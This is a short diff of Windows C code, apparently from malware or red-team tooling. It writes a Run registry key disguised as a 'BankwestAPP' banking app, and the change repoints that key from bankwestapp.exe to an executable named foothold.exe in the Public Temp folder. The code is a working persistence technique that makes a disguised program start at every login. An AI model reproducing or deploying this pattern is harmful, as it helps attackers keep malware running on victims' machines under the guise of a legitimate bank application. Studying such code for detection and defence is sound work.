@@ -44,9 +44,9 @@ int main()
 //Set registry runkey Value - point to bankwestapp.exe
 
 	HKEY hkey;
-	LPCSTR set_string_value = "c:\\Users\\Public\\Temp\\bankwestapp.exe";
+	LPCSTR set_string_value = "c:\\Users\\Public\\Temp\\foothold.exe";
 	//const char set_string_value [] = {'b','a','n','k','w','e','s','t','\0'};
-	//char* subkeyname = "BankwestAPP";
+	//char* subkeyname = "Bankwest App";
 
 	RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey); //open registry key handle.
 	RegSetValueExA(hkey, "BankwestAPP", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);	
